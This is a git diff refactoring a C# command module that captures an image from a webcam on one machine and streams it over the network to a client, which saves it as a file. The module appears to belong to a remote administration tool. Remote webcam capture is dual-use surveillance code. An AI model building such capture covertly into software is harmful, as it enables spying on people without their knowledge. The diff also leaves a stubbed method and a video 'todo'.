@@ -1,14 +1,13 @@
-﻿using System;
+﻿using AForge.Video;
+using AForge.Video.DirectShow;
+using NetworkManager;
+using Shared;
+using System;
 using System.Collections.Generic;
-using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
 using System.Timers;
-using AForge.Video;
-using AForge.Video.DirectShow;
-using NetworkManager;
-using Shared;
 using Timer = System.Timers.Timer;
 
 namespace Commands
@@ -28,14 +27,6 @@ namespace Commands
         {
             new List<Type>(){typeof(string), typeof(string)}
         };
-
-        public List<string> clientFlags { get; } = new List<string>()
-        {
-            "{Webcam:pic}",
-            "{Webcam:video}"
-        };
-
-        public List<string> savedData { get; set; } = new List<string>();
         #endregion ICommand properties
 
         VideoCaptureDevice video { get; set; }
@@ -43,15 +34,14 @@ namespace Commands
         bool mustReturn { get; set; }
 
 
-        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
+        public bool PreProcessCommand(List<string> args)
         {
-            savedData.Add(args[1]);
-            return CommandsManager.PreProcessResult.OK;
+            throw  new NotImplementedException();
         }
 
         public void ClientMethod(List<string> args)
         {
-            var fileName = savedData[0];
+            var fileName = args[1];
 
             var result = GlobalNetworkManager.ReadLine();
 
@@ -71,7 +61,7 @@ namespace Commands
             {
                 using (var fs = new FileStream(fileName, FileMode.Create))
                 {
-                    GlobalNetworkManager.ReadNetworkStreamAndWriteToStream(fs, 4096, dataLength);
+                    GlobalNetworkManager.NetworkStreamToStream(fs, dataLength);
                 }
 
                 ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
@@ -86,7 +76,7 @@ namespace Commands
 
         public void ServerMethod(List<string> args)
         {
-            GlobalNetworkManager.WriteLine(clientFlags[0]);
+            // todo : implement video
             mustReturn = false;
 
             FilterInfo captureDevice;
@@ -130,7 +120,7 @@ namespace Commands
 
                 // Reset memory stream position
                 ms.Position = 0;
-                GlobalNetworkManager.ReadStreamAndWriteToNetworkStream(ms, 4096);
+                GlobalNetworkManager.StreamToNetworkStream(ms);
             }
 
             mustReturn = true;
